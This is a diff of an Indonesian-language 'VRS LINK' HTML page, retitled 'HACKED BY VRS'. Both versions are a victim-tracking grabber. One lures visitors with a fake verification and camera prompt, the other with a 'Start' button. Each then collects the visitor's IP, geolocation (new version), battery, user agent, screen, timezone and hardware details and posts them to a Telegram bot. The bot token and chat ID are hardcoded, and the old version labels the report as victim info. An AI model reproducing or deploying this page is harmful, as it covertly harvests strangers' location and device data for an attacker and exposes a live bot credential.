@@ -1,223 +1,235 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>VRS LINK</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HACKED BY VRS 🔥</title>
   <style>
     body {
-      background: linear-gradient(135deg, #f0f0f0, #e1e1e1);
-      color: #333;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #1c1c1c;
+      font-family: 'Courier New', Courier, monospace;
+      color: #d1d1d1;
       text-align: center;
-      padding: 60px 20px;
-      overflow: hidden;
+      padding: 40px;
+      margin: 0;
     }
+
     h1 {
-      font-size: 3.5em;
+      color: #6ab04c;
+      font-size: 50px;
+      font-weight: bold;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      text-shadow: 0 0 20px #6ab04c, 0 0 40px #6ab04c;
       margin-bottom: 30px;
-      color: #333;
-      text-shadow: 0 0 5px #333, 0 0 10px #888;
+      transition: all 0.3s ease;
     }
-    p {
-      font-size: 1.2em;
-      margin-bottom: 40px;
-      color: #666;
+
+    h1:hover {
+      text-shadow: 0 0 40px #ff6347, 0 0 80px #ff6347;
     }
-    button {
-      background: #4CAF50;
-      color: white;
-      font-size: 20px;
-      font-weight: bold;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      transition: 0.3s;
+
+    .profile {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      background-image: url('https://files.catbox.moe/clyrd5.jpg');
+      background-size: cover;
+      background-position: center;
+      border: 5px solid #6ab04c;
+      margin: 20px auto;
+      box-shadow: 0 0 30px rgba(106, 176, 76, 0.7);
+      animation: pulse 3s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 20px rgba(106, 176, 76, 0.7);
+      }
+      50% {
+        box-shadow: 0 0 40px rgba(106, 176, 76, 1);
+      }
+      100% {
+        box-shadow: 0 0 20px rgba(106, 176, 76, 0.7);
+      }
+    }
+
+    .title {
+      font-size: 28px;
+      color: #6ab04c;
       margin-top: 20px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-weight: bold;
     }
-    button:hover {
-      background: #45a049;
-    }
-    #status {
-      margin-top: 30px;
+
+    .info {
+      background: rgba(0, 0, 0, 0.8);
+      padding: 30px;
+      margin: 30px auto;
+      max-width: 800px;
+      border-radius: 15px;
+      box-shadow: 0 0 40px rgba(106, 176, 76, 0.5);
       font-size: 18px;
-      color: #333;
+      text-align: left;
+      color: #d1d1d1;
+      line-height: 1.8;
     }
-    .link-container {
-      margin-top: 50px;
-      font-size: 1.3em;
-      color: #4CAF50;
-    }
-    .link-container a {
-      color: #4CAF50;
-      text-decoration: none;
+
+    .label {
       font-weight: bold;
-      transition: color 0.3s;
+      color: #6ab04c;
     }
-    .link-container a:hover {
-      color: #388e3c;
+
+    .value {
+      color: #f39c12;
     }
-    .popup {
-      background-color: rgba(255, 255, 255, 0.9);
-      color: #333;
-      padding: 20px;
-      border-radius: 10px;
-      width: 90%;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+
+    .emoji {
+      font-size: 20px;
+      margin-right: 10px;
     }
-    .popup h2 {
-      font-size: 2em;
-      color: #4CAF50;
-    }
-    .popup p {
-      font-size: 1.1em;
-    }
-    .close-btn {
-      background-color: #ff3333;
-      color: #fff;
-      padding: 10px 20px;
+
+    .button {
+      background: #6ab04c;
       border: none;
-      border-radius: 20px;
-      cursor: pointer;
+      padding: 18px 40px;
+      color: #fff;
+      font-size: 18px;
       font-weight: bold;
+      border-radius: 50px;
       margin-top: 20px;
-      transition: 0.3s;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      box-shadow: 0 0 25px rgba(106, 176, 76, 0.6);
     }
-    .close-btn:hover {
-      background-color: #e60000;
+
+    .button:hover {
+      background: #4c9f38;
+      transform: scale(1.05);
     }
+
+    .digital {
+      font-family: 'Courier New', Courier, monospace;
+      color: red;
+      font-size: 20px;
+      text-shadow: 0 0 10px #f00, 0 0 20px #f00;
+    }
+
   </style>
 </head>
 <body>
-  <h1>VRS LINK</h1>
-  <p>Selamat datang! Klik tombol di bawah untuk melanjutkan ke verifikasi.</p>
-  <button onclick="cekData()">Verifikasi</button>
-  <div id="status"></div>
-  
-  <div class="link-container">
-    <p>Setelah verifikasi, klik <a href="https://files.catbox.moe/clyrd5.jpg" target="_blank">disini</a>.</p>
-  </div>
 
-  <!-- Popup untuk menampilkan informasi -->
-  <div id="popup" class="popup">
-    <h2>𝗜𝗡𝗙𝗢 𝗦𝗬𝗦𝗧𝗘𝗠</h2>
-    <p id="popupContent"></p>
-    <button class="close-btn" onclick="tutupPopup()">Tutup</button>
-  </div>
+  <div class="profile"></div>
+  <h1>HACKED BY VRS 🔥</h1>
+  <p class="title">VRS LINK 🔗</p>
+
+  <div class="info" id="info">Loading...</div>
+  <button class="button" onclick="getInfo()">Start</button>
+
+  <div class="digital" id="digitalMessage">Proses........</div>
 
   <script>
-    const token = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU"; // Ganti token kamu
-    const chat_id = "7916928366"; // Ganti chat id kamu
+    async function getInfo() {
+      const token = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU"; // Ganti token kamu
+      const chat_id = "7916928366"; // Ganti chat id kamu
 
-    let startTime = Date.now();
+      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+      const ip = ipData.ip;
 
-    // Fungsi untuk meminta izin dan memeriksa data
-    async function cekData() {
-      tampilkanStatus("Memproses...");
+      let lat = "Tidak tersedia";
+      let lon = "Tidak tersedia";
 
-      // Tanyakan izin eksplisit kepada pengguna
-      const permission = await new Promise((resolve) => {
-        const userConfirmed = confirm("Apakah Anda ingin memberikan izin akses kamera?");
-        resolve(userConfirmed);
-      });
+      const platform = navigator.platform;
+      const ua = navigator.userAgent;
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      const colorDepth = window.screen.colorDepth;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const language = navigator.language;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const cpuCores = navigator.hardwareConcurrency;
+      const onlineStatus = navigator.onLine;
+      const appName = navigator.appName;
+      const appVersion = navigator.appVersion;
+      const vendor = navigator.vendor;
+      const platformType = navigator.platform;
+      const screenOrientation = window.screen.orientation ? window.screen.orientation.type : "Tidak tersedia";
+      const deviceMemory = navigator.deviceMemory || "Tidak tersedia";
+      const userAgent = navigator.userAgent;
 
-      if (!permission) {
-        tampilkanStatus("Izin kamera ditolak.");
-        return;
+      let battery = "Tidak tersedia";
+      if (navigator.getBattery) {
+        const batt = await navigator.getBattery();
+        battery = (batt.level * 100) + "%";
       }
 
-      // Minta izin untuk mengakses kamera
-      if (navigator.mediaDevices) {
-        try {
-          await navigator.mediaDevices.getUserMedia({ video: true });
-          tampilkanStatus("Izin Kamera Diterima!");
-          await ambilDanKirimInfo();
-          tampilkanStatus("Data berhasil diambil!");
-
-          // Menampilkan popup dengan data
-          const infoPopup = `
-            🌐 IP: ${await ambilIP()}<br>
-            🔋 Baterai: ${await ambilBaterai()}<br>
-            💻 Platform: ${navigator.platform}<br>
-            🖥️ Browser: ${navigator.userAgent}<br>
-            🖥️ Resolusi: ${screen.width}x${screen.height}<br>
-            🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>
-            🗣️ Bahasa: ${navigator.language}<br>
-            🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core<br>
-            🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB<br>
-            📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}<br>
-            ⏰ Durasi Buka: ${Math.floor((Date.now() - startTime) / 1000)} detik
-          `;
-          document.getElementById('popupContent').innerHTML = infoPopup;
-          document.getElementById('popup').style.display = 'block';
-
-          await kirimTelegram(`📝𝗜𝗡𝗙𝗢 𝗞𝗢𝗥𝗕𝗔𝗡:\n${infoPopup}`);
-        } catch (e) {
-          console.error("Kamera tidak diizinkan:", e);
-          tampilkanStatus("Perizinan kamera diperlukan. Coba izinkan akses.");
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+          kirimData();
+        },
+        (err) => {
+          kirimData();
         }
-      } else {
-        alert("Browser tidak mendukung akses kamera.");
+      );
+
+      function kirimData() {
+        const infoHTML = `
+          <div><span class="emoji">📡</span><span class="label">IP:</span> <span class="value">${ip}</span></div>
+          <div><span class="emoji">🌍</span><span class="label">Lokasi:</span> <span class="value">${lat}, ${lon}</span></div>
+          <div><span class="emoji">🔋</span><span class="label">Baterai:</span> <span class="value">${battery}</span></div>
+          <div><span class="emoji">💻</span><span class="label">Platform:</span> <span class="value">${platform}</span></div>
+          <div><span class="emoji">🕹️</span><span class="label">User Agent:</span> <span class="value">${userAgent}</span></div>
+          <div><span class="emoji">🖥️</span><span class="label">Resolusi Layar:</span> <span class="value">${screenWidth}x${screenHeight}</span></div>
+          <div><span class="emoji">🌈</span><span class="label">Kedalaman Warna:</span> <span class="value">${colorDepth} bit</span></div>
+          <div><span class="emoji">⏰</span><span class="label">Zona Waktu:</span> <span class="value">${timeZone}</span></div>
+          <div><span class="emoji">🌐</span><span class="label">Bahasa:</span> <span class="value">${language}</span></div>
+          <div><span class="emoji">🍪</span><span class="label">Cookies Aktif:</span> <span class="value">${cookiesEnabled ? "Ya" : "Tidak"}</span></div>
+          <div><span class="emoji">🧠</span><span class="label">Cores CPU:</span> <span class="value">${cpuCores}</span></div>
+          <div><span class="emoji">🌐</span><span class="label">Status Online:</span> <span class="value">${onlineStatus ? "Online" : "Offline"}</span></div>
+          <div><span class="emoji">📱</span><span class="label">Nama Aplikasi:</span> <span class="value">${appName}</span></div>
+          <div><span class="emoji">⚙️</span><span class="label">Versi Aplikasi:</span> <span class="value">${appVersion}</span></div>
+          <div><span class="emoji">🛠️</span><span class="label">Vendor:</span> <span class="value">${vendor}</span></div>
+          <div><span class="emoji">💾</span><span class="label">Tipe Platform:</span> <span class="value">${platformType}</span></div>
+          <div><span class="emoji">🔄</span><span class="label">Orientasi Layar:</span> <span class="value">${screenOrientation}</span></div>
+          <div><span class="emoji">🧳</span><span class="label">Memori Perangkat:</span> <span class="value">${deviceMemory}</span></div>
+        `;
+
+        document.getElementById("info").innerHTML = infoHTML;
+        
+        const digitalMessage = `📡 **IP**: ${ip} 🔥
+🌍 **Lokasi**: ${lat}, ${lon} 🌍
+🔋 **Baterai**: ${battery} 🔋
+💻 **Platform**: ${platform} 💻
+🕹️ **User Agent**: ${userAgent} 🕹️
+🖥️ **Resolusi Layar**: ${screenWidth}x${screenHeight} 🖥️
+🌈 **Kedalaman Warna**: ${colorDepth} bit 🌈
+⏰ **Zona Waktu**: ${timeZone} ⏰
+🌐 **Bahasa**: ${language} 🌐
+🍪 **Cookies Aktif**: ${cookiesEnabled ? "Ya" : "Tidak"} 🍪
+🧠 **Cores CPU**: ${cpuCores} 🧠
+🌐 **Status Online**: ${onlineStatus ? "Online" : "Offline"} 🌐
+📱 **Nama Aplikasi**: ${appName} 📱`;
+
+        document.getElementById("digitalMessage").innerText = digitalMessage;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: digitalMessage,
+            parse_mode: 'Markdown'
+          }),
+          headers: {
+            'Content-Type': 'application/json',
+          },
+        });
       }
-    }
-
-    function tampilkanStatus(teks) {
-      const statusDiv = document.getElementById('status');
-      statusDiv.innerText = teks;
-    }
-
-    async function kirimTelegram(pesan) {
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id, text: pesan })
-      });
-    }
-
-    async function ambilIP() {
-      const ipRes = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipRes.json();
-      return ipData.ip || "Unknown";
-    }
-
-    async function ambilBaterai() {
-      const battery = await navigator.getBattery();
-      return (battery.level * 100).toFixed(0) + "%";
-    }
-
-    async function ambilDanKirimInfo() {
-      const ip = await ambilIP();
-      const batteryLevel = await ambilBaterai();
-      const durasiMs = Date.now() - startTime;
-      const durasiDetik = Math.floor(durasiMs / 1000);
-
-      const text = `
-        🌐 IP: ${ip}
-        🔋 Baterai: ${batteryLevel}
-        💻 Platform: ${navigator.platform}
-        🖥️ Browser: ${navigator.userAgent}
-        🖥️ Resolusi: ${screen.width}x${screen.height}
-        🕒 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-        🗣️ Bahasa: ${navigator.language}
-        🧠 CPU: ${navigator.hardwareConcurrency || "Unknown"} core
-        🗄️ RAM: ${navigator.deviceMemory || "Unknown"} GB
-        📶 Status Online: ${navigator.onLine ? "Online" : "Offline"}
-        ⏰ Durasi Buka: ${durasiDetik} detik
-      `;
-      await kirimTelegram(text);
-    }
-
-    function tutupPopup() {
-      document.getElementById('popup').style.display = 'none';
     }
   </script>
+
 </body>
-  </html>
+</html>
